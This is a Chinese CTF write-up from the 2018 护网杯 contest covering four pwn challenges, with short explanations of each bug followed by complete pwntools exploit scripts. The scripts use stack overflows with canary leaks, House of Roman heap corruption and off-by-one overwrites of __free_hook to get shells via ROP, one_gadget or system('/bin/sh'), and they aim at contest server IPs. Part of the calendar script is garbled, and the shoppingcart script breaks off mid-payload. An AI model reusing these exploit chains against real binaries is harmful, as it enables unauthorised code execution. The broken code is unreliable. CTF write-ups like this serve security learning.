# 2018护网杯线上赛writeup by 天枢
author: 天枢
## Pwn
### huwang
emmmm，只有666功能里面有用，里面会打开一个文件，然后写随机数进去，而在md5的时候，会先清空文件内容，然后再将md5之后的数据写入到文件中，如果这时候给个-1程序就会超时，自动杀死自己，结果导致文件内容为空，这样就可以预测，剩下的就是一个栈溢出了。。。。
    from pwn import *
    context(arch = 'amd64', os = 'linux', endian = 'little')
    context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    def sixsixsix(p, name, rd, secret, flag = 1):
        p.recvuntil('>> \n')
        p.sendline('666')
        p.recvuntil('name\n')
        p.send(name)
        p.recvuntil('secret?\n')
        p.sendline('y')
        p.recvuntil('secret:\n')
        p.sendline(str(rd))
        if flag == 1:
            p.recvuntil('secret\n')
            p.send(secret)
    def GameStart(ip, port, debug):
        if debug == 1:
            p = process('./huwang')
        else:
            p = remote(ip, port)
        sixsixsix(p, 'w1tcher', -1, 'w1tcher', 0)
        p.recvuntil('timeout~')
        if debug == 1:
            p = process('./huwang', env = {'LD_PRELOAD' : './libc.so.6'})
            gdb.attach(p, 'b *0x040110D\nc')
        else:
            p = remote(ip, port)
        libc = ELF('./libc.so.6')
        sixsixsix(p, 'w1tcher'.ljust(0x19, 'a'), 1, '4ae71336e44bf9bf79d2752e234818a5'.decode('hex'))
        p.recvuntil('w1tcher'.ljust(0x19, 'a'))
        canary = u64('\x00' + p.recvn(7))
        p.recvuntil('occupation?\n')
        p.send('a' * 0xff)
        p.recvuntil('[Y/N]\n')
        p.sendline('Y')
        shellcode = 'a' * 0x108 + p64(canary) + p64(0)
        shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C)
        p.send(shellcode)
        p.recvuntil('Congratulations, ')
        libc_addr = u64(p.recvn(6) + '\x00' * 2) - libc.symbols['puts']
        p.recvuntil('occupation?\n')
        p.send('a' * 0xff)
        p.recvuntil('[Y/N]\n')
        p.sendline('Y')
        shellcode = 'a' * 0x108 + p64(canary) + p64(0)
        shellcode += p64(0x0000000000401573) + p64(next(libc.search('/bin/sh')) + libc_addr) + p64(libc_addr + libc.symbols['system'])
        p.send(shellcode)
        p.interactive()
    if __name__ == '__main__':
        GameStart('117.78.26.79', 31399, 1)
### calendar
官方提示House of Roman，但是，你为啥不提示一下libc呢？
    from pwn import *
    context(arch = 'amd64', os = 'linux', endian = 'little')
    context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    def add(p, index, size):
        p.recvuntil('choice> ')
        p.sendline('1')
        p.recvuntil('choice> ')
        p.sendline(str(index + 1))
        p.recvuntil('size> ')
        p.sendline(str(size))
    def edit(p, index, size, data):
        p.recvuntil('choice> ')
        p.sendline('2')
        p.recvuntil('choice> ')
        p.sendline(str(index + 1))
        p.recvuntil('size> ')
        p.sendline(str(size))
        p.recvuntil('info> ')
        p.send(data)
    def remove(p, index):
        p.recvuntil('choice> ')
        p.sendline('3')
        p.recvuntil('choice> ')
        p.sendline(str(index + 1))
    def get_base(p):
        with open('/proc/' + str(pidof(p)[0]) + '/maps') as f:
            data = f.read()
        with open('/proc/' + str(pidof(p)[0]) + '/environ') as f:
            environ = f.read()
        if 'LD_PRELOAD' not in environ:
            libcPath = os.readlink('/')
        else:
            libcPath = 'libc.so.6'
        libcBase = -1
        if libcBase  ')
        p.sendline('w1tcher')
        libc_base = 0xb42000
        # libc_base = get_base(p) & 0xfff000
        log.info('libc base is : ' + hex(libc_base))
        malloc_hook = 0x3c4b10
        # one_gadget = 0x45216
        # one_gadget = 0x4526a
        # one_gadget = 0xf02a4
        one_gadget = 0xf1147
        add(p, 0, 0x68)
        add(p, 0, 0x68)
        add(p, 0, 0x18)
        add(p, 1, 0x60)
        add(p, 2, 0x60)
        add(p, 2, 0x60)
        edit(p, 0, 0x18, '\x00' * 0x18 + '\xe1')
        remove(p, 1)
        add(p, 0, 0x60)
        add(p, 1, 0x60)
        edit(p, 0, 2, p64(libc_base + malloc_hook - 0x23)[0 : 3])
        remove(p, 1)
        remove(p, 2)
        edit(p, 2, 1, '\n')
        add(p, 1, 0x60)
        add(p, 0, 0x60)
        add(p, 0, 0x60)
        remove(p, 1)
        edit(p, 1, 7, p64(0))
        add(p, 1, 0x60)
        add(p, 1, 0x60)
        add(p, 1, 0x40)
        edit(p, 1, 0x40 - 1, p64(0) * 6 + p64(0) + p64(0x71))
        add(p, 1, 0x60)
        edit(p, 1, 0x60 - 1, p64(0) * 8 + p64(0x50) + p64(0x20) + p64(0) + p64(0x71))
        add(p, 2, 0x60)
        add(p, 3, 0x60)
        remove(p, 3)
        remove(p, 2)
        edit(p, 2, 1, '\n')
        add(p, 2, 0x60)
        add(p, 2, 0x60)
        edit(p, 2, 0x10 - 1, p64(0) + p64(0xe1))
        remove(p, 1)
        edit(p, 2, 0x1b - 1, p64(0) + p64(0x51) + p64(0) + p64(libc_base + malloc_hook - 0x10)[0 : 3])
        add(p, 3, 0x40)
        edit(p, 0, 0x16 - 1, '\x00' * 0x13 + p64(libc_base + one_gadget)[0 : 3])
        add(p, 3, 0x40)
        p.sendline('cat flag')
        p.sendline('cat flag')
        p.sendline('cat flag')
        p.interactive()
    if __name__ == '__main__':
        debug = 0
        while True:
            try:
                if debug == 1:
                    p = process('./task_calendar', env = {'LD_PRELOAD' : './libc.so.6'})
                    # gdb.attach(p, '\nc')
                else:
                    p = remote('117.78.40.144', 31274)
                GameStart(p)
            except Exception as e:
                # raise e
                p.close()
### gettingstart
签到题
    from pwn import *
    p = remote('117.78.40.144', 32671)
    #p = process('task_gettingStart_ktQeERc')
    p.send('a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A))
    p.interactive()
### shoppingcart
在edit功能存在一个整数溢出，和一个off-by-one  
首先申请并释放得到unsorted bin，再malloc(0)，就可以泄露main _arena+344的地址  
可以申请多个money，然后编辑最后一个money，可以null-off-by-one给最后一个指针  
最后一个指针落到fgets的缓冲区中.通过fgets输入，预置好null-off-by-one的位置指向\__free_hook  
就可以将其改为system，触发free就可执行 system("/bin/sh")  
emmmm 远程和本地的fgets块大小不一样，有点伤，试了好久。。。
    from pwn import *
    import time
    debug=1
    lib = 0
    if lib==0:
        libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
        offset = 0x230
        one_gadget = [0x45216,0x4526a,0xf0274,0xf1117]
    else:
        libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
        offset = 0x260
        one_gadget = [0x45216,0x4526a,0xef6c4,0xf0567]
    context.log_level = 'debug'
    elf = ELF('./task_shoppingCart')
    if debug:
        p= process('./task_shoppingCart')#,env={'LD_PRELOAD' :libc_name})
        libc = ELF(libc_name)
    else:
        p = remote( '117.78.26.133', 31666)#process('./pwn1')
        libc = ELF(libc_name)
        offset = 0x230
    def add(size,name):
        p.recvuntil("Now, buy buy buy!")
        p.sendline('1')
        p.recvuntil("name?")
        p.sendline(str(size))
        p.recvuntil("What is your goods name?")
        p.send(name)
    def delete(idx):
        p.recvuntil("Now, buy buy buy!")
        p.sendline('2')
        p.recvuntil("Which goods that you don't need?")
        p.sendline(str(idx) )
    def edit(idx):
        p.recvuntil("Now, buy buy buy!")
        p.sendline('3') 
        p.recvuntil("Which goods you need to modify?")
        p.sendline(str(idx))
    def edit_vul(context):
        p.recvuntil("Now, buy buy buy!")
        p.sendline('3') 
        p.recvuntil("Which goods you need to modify?")
        p.send(context)
    if debug:
        attach(p)
    for i in range(0x13):
        p.recvuntil("EMMmmm, you will be a rich man!")
        p.sendline('1')
        p.recvuntil("I will give you $9999, but what's the  currency type you want, RMB or Dollar?")
        p.sendline('a'*8)
    p.recvuntil("EMMmmm, you will be a rich man!")
    p.sendline('1')
    p.recvuntil("I will give you $9999, but what's the  currency type you want, RMB or Dollar?")
    p.sendline('b'*8)   
    p.recvuntil("EMMmmm, you will be a rich man!")
    p.sendline('3')
    add(0x100,'p4nda') #0
    add(0x70,'/bin/sh\0') #1
    delete(0)
    add(0,'')#2
    edit(2)
    p.recvuntil('OK, what would you like to modify ')
    libc_addr = u64(p.recv(6).ljust(8,'\0'))
    libc.address = libc_addr- 0x10 - 344 -libc.symbols['__malloc_hook'] 
    p.send('p4nda')
    print '[+] leak',hex(libc_addr) 
    print '[+] system',hex(libc.symbols['system']) 
    edit( (0x202140+19*8 - 0x2021E0 )/8 &0xffffffffffffffff )
    p.recvuntil('to?')
    p.send('d'*8)
    payload = (str((0x202140 - 0x2021E0 )/8 &0xffffffffffffffff)+'\n') 
    payload+= (str(2)+'\n') 
    payload+= (str(1)+'\n')